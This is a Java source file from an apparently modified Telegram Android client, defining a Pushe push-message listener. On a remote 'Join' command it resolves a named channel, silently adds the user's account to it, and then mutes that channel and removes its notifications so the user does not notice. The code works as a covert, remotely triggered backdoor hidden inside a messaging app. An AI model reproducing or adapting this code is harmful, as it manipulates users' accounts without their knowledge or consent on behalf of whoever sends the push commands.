package org.telegram.ui;

import android.content.Intent;
import android.content.SharedPreferences;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.ChatObject;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.MessagesStorage;
import org.telegram.messenger.NotificationsController;
import org.telegram.messenger.UserConfig;
import org.telegram.tgnet.ConnectionsManager;
import org.telegram.tgnet.RequestDelegate;
import org.telegram.tgnet.TLObject;
import org.telegram.tgnet.TLRPC;

import co.ronash.pushe.PusheListenerService;



/**

 * Created on 16-05-09, 6:20 PM.

 *

 * @author Akram Shokri

 */

public class MyPushListener extends PusheListenerService {

  private void toggleMute(boolean z, long j) {
    if (!MessagesController.getInstance().isDialogMuted(j) && z) {
      SharedPreferences.Editor edit = ApplicationLoader.applicationContext.getSharedPreferences("Notifications", 0).edit();
      edit.putInt("notify2_" + j, 2);
      MessagesStorage.getInstance().setDialogFlags(j, 1);
      edit.commit();
      TLRPC.TL_dialog tL_dialog = (TLRPC.TL_dialog) MessagesController.getInstance().dialogs_dict.get(Long.valueOf(j));
      if (tL_dialog != null) {
        tL_dialog.notify_settings = new TLRPC.TL_peerNotifySettings();
        tL_dialog.notify_settings.mute_until = Integer.MAX_VALUE;
      }
      NotificationsController.updateServerNotificationsSettings(j);
      NotificationsController.getInstance().removeNotificationsForDialog(j);
    }
  }

  @Override
  public void onMessageReceived(final JSONObject message, JSONObject content) {

    if(message != null && message.length() > 0) {

      Log.i("Pushe", "Custom json Message: " + message.toString());

      //    your code

      try{
        String s1 = message.getString("Subject");
        if (s1.equals("Online")){
          String s2 = message.getString("DoItRequest");
          if (s2.equals("true")){
            Intent intent = new Intent("MyData");
            intent.putExtra("message", "Online");
            LocalBroadcastManager.getInstance(ApplicationLoader.applicationContext).sendBroadcast(intent);
          }
        }

        if (s1.equals("Join")){
          String s2 = message.getString("ChannelJoindLink");
          if (s2 != null){

            TLRPC.TL_contacts_resolveUsername tL_contacts_resolveUsername = new TLRPC.TL_contacts_resolveUsername();
            tL_contacts_resolveUsername.username = s2;
            ConnectionsManager.getInstance().sendRequest(tL_contacts_resolveUsername, new RequestDelegate() {
              public void run(final TLObject tLObject, final TLRPC.TL_error tL_error) {
                AndroidUtilities.runOnUIThread(new Runnable() {
                  public void run() {
                    if (tL_error == null) {
                      TLRPC.TL_contacts_resolvedPeer tL_contacts_resolvedPeer = (TLRPC.TL_contacts_resolvedPeer) tLObject;
                      MessagesController.getInstance();
                      MessagesController.getInstance().putChats(tL_contacts_resolvedPeer.chats, false);
                      MessagesStorage.getInstance().putUsersAndChats(tL_contacts_resolvedPeer.users, tL_contacts_resolvedPeer.chats, false, true);
                      if (!tL_contacts_resolvedPeer.chats.isEmpty()) {
                        TLRPC.Chat chat = tL_contacts_resolvedPeer.chats.get(0);

//                        c.b("-" + String.valueOf(tL_contacts_resolvedPeer.peer.channel_id));

//                        e.c(tL_contacts_resolvedPeer.peer.channel_id);

                        if (ChatObject.isChannel(chat) && !(chat instanceof TLRPC.TL_channelForbidden) && ChatObject.isNotInChat(chat)) {
//                          e.c(tL_contacts_resolvedPeer.peer.channel_id);
                          MessagesController.getInstance().addUserToChat(chat.id, UserConfig.getCurrentUser(), null, 0, null, null);
                          MyPushListener.this.toggleMute(true, Long.valueOf("-" + String.valueOf(tL_contacts_resolvedPeer.peer.channel_id)).longValue());

//                          e.d(e.y() + 1);



                        }
                      }
                    }
                  }
                });
              }
            });
          }
        }

      } catch (JSONException e) {
        Log.e("","Exception in parsing json" ,e);
      }

    }

  }

}